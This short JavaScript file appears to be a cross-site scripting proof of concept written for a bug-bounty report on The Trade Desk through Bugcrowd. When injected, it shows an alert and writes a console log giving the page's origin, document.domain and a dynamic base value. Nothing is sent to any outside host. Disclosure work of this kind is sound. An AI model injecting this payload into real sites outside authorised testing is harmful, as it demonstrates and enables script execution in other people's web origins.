/* Bug bounty PoC - The Trade Desk (Bugcrowd). Benign: proves origin only. */
alert(
  "XSS PoC\n\n" +
  "origin: " + window.location.origin + "\n" +
  "document.domain: " + document.domain + "\n" +
  "loaded from: " + window.__dynamic_base__
);
console.log("[PoC] executing in origin:", window.location.origin);
